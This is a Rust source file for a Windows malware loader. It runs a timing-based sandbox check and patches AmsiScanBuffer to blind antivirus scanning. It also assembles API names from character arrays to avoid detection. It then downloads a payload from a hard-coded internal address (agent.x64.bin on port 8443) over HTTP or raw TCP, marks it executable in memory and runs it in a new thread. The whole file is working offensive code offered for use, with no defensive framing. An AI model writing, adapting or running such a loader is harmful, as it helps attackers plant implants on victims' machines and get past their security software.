extern crate winapi;
use reqwest;
use std::ffi::CString;
use std::io::Read;
use std::mem::transmute;
use std::net::TcpStream;
use std::process::exit;
use std::ptr::{copy, null, null_mut};
use std::thread::sleep;
use std::time::Duration;
use std::time::SystemTime;
use std::vec::Vec;
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::basetsd::ULONG_PTR;
use winapi::shared::minwindef::{BOOL, DWORD, FALSE, LPVOID};
use winapi::um::libloaderapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::sysinfoapi::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
use winapi::um::winnt::*;
use windows_sys::Win32::Foundation::WAIT_FAILED;
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};
use std::{ptr};

use winapi::um::{
        memoryapi::{
            VirtualProtect,
            WriteProcessMemory
        },
        libloaderapi::{
            LoadLibraryA,
            GetProcAddress
        },
        processthreadsapi::GetCurrentProcess,
        winnt::PAGE_READWRITE
    };

unsafe fn allocate_and_randomize(size: SIZE_T) -> LPVOID {
    let mut buffer: Vec<u8> = vec![0; size as usize];

    let elapsed = SystemTime::now().elapsed().unwrap();
    let random_value = (elapsed.as_millis() % 0xFF) as u8;
    buffer[0] = random_value;

    buffer.as_mut_ptr() as LPVOID
}

unsafe fn enhanced_anti_debugging() {
    let p_address = allocate_and_randomize(0x100);

    if !p_address.is_null() && *(p_address as *mut u8) > 128 {
        for _ in 0..3 {
            let _value: ULONG_PTR = GetCurrentThreadId() as ULONG_PTR;
            sleep(Duration::from_millis(1));
        }
    } else {
        sleep(Duration::from_millis(10));
    }
}
unsafe fn asds(){
    // Getting the address of AmsiScanBuffer.
    let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
    let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
    let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
    let mut old_permissions: DWORD = 0;

    // Overwrite this address with nops.
    if VirtualProtect(amsi_scan_addr.cast(), 6, PAGE_READWRITE, &mut old_permissions) == FALSE {
        panic!("[-] Failed to change protection.");
    }
    let written: *mut usize = ptr::null_mut();

    if WriteProcessMemory(GetCurrentProcess(), amsi_scan_addr.cast(), patch.as_ptr().cast(), 6, written) == FALSE {
        panic!("[-] Failed to overwrite function.");
    }

    // Restoring the permissions.
    VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
    println!("[+] AmsiScanBuffer patched!");
}

fn load_function(module: &str, proc_name: &str) -> *const () {
    let module_cstr = CString::new(module).unwrap();
    let proc_name_cstr = CString::new(proc_name).unwrap();

    unsafe {
        let module_handle = GetModuleHandleA(module_cstr.as_ptr());
        if module_handle.is_null() {
            exit(1)
        }

        let proc_address = GetProcAddress(module_handle, proc_name_cstr.as_ptr());
        if proc_address.is_null() {
            exit(1)
        }

        proc_address as *const ()
    }
}

type VirtualAllocFunc = unsafe extern "system" fn(LPVOID, SIZE_T, DWORD, DWORD) -> LPVOID;
type VirtualProtectFunc = unsafe extern "system" fn(LPVOID, SIZE_T, DWORD, &mut DWORD) -> BOOL;

fn get_payload_from_url(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    if url.starts_with("https://") || url.starts_with("http://") {
        let mut payload = Vec::new();
        let mut response = reqwest::blocking::get(url)?;
        response.copy_to(&mut payload)?;
        Ok(payload)
    } else if url.starts_with("tcp://") {
        // Strip the tcp:// scheme so TcpStream::connect sees "host:port"
        let addr = &url["tcp://".len()..];
        download_binary_to_vec(addr, Duration::from_secs(180))
    } else {
        Err("unsupported URL scheme".into())
    }
}

fn download_binary_to_vec(
    addr: &str,
    timeout: Duration,
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut stream = TcpStream::connect(addr)?;
    stream.set_read_timeout(Some(timeout))?;
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf)?;
    let len = u32::from_le_bytes(len_buf) as usize;
    let mut data = vec![0u8; len];
    stream.read_exact(&mut data)?;
    Ok(data)
}

fn evade() {
    let start = std::time::Instant::now();
    sleep(Duration::from_millis(2000));
    let elapsed = start.elapsed();

    if elapsed.as_secs_f64() < 1.5 {
        exit(1);
    }

    unsafe {
        enhanced_anti_debugging();
    }

    let mut statex: MEMORYSTATUSEX = unsafe { std::mem::zeroed() };
    statex.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;

    unsafe {
        GlobalMemoryStatusEx(&mut statex);
    }

    // let total_memory_in_gb = statex.ullTotalPhys / (1024 * 1024 * 1024);
    // if total_memory_in_gb <= 1 {
    //     exit(1);
    // }
    unsafe {
        asds();
    }
}
fn main() {
    evade();
    let virtual_alloc: [char; 12] = ['V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c'];
    let virtual_alloc_str: String = virtual_alloc.iter().collect();

    let virtual_protect: [char; 14] = [
        'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't',
    ];
    let virtual_protect_str: String = virtual_protect.iter().collect();

    let pw_virtual_alloc: VirtualAllocFunc =
        unsafe { std::mem::transmute(load_function("kernel32.dll", &virtual_alloc_str)) };
    let pw_virtual_protect: VirtualProtectFunc =
        unsafe { std::mem::transmute(load_function("kernel32.dll", &virtual_protect_str)) };

    let url = "http://10.200.47.3:8443/agent.x64.bin";
    let payload = match get_payload_from_url(url) {
        Ok(data) => data,
        Err(_e) => {
            println!("Error getting payload from url {}", _e);
            exit(1);
        }
    };

    unsafe {
        let addr = pw_virtual_alloc(
            null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            exit(1);
        }
        copy(payload.as_ptr(), addr.cast(), payload.len());

        let mut old = PAGE_READWRITE;
        let res = pw_virtual_protect(addr, payload.len(), PAGE_EXECUTE, &mut old);
        if res == FALSE {
            exit(1);
        }

        let addr = transmute(addr);
        let thread = CreateThread(null(), 0, addr, null(), 0, null_mut());
        if thread == 0 {
            exit(1);
        }

        WaitForSingleObject(thread, WAIT_FAILED);
    }
}
